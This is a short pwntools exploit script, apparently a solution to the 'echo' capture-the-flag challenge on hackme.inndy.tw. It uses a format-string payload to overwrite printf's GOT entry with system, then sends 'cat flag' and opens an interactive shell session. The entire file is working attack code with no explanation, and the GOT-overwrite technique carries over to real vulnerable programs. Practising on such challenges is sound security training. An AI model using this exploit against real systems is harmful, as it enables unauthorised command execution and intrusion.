from pwn import *
#context.log_level="debug"
a=remote("hackme.inndy.tw",7711)
#a=process("./echo")
elf=ELF("./echo")
offset=7

printf_got=elf.got["printf"]
system_plt=elf.plt["system"]

payload=fmtstr_payload(7,{printf_got:system_plt})
a.sendline(payload)
sleep(1)
a.sendline("cat flag\x00")
a.interactive()

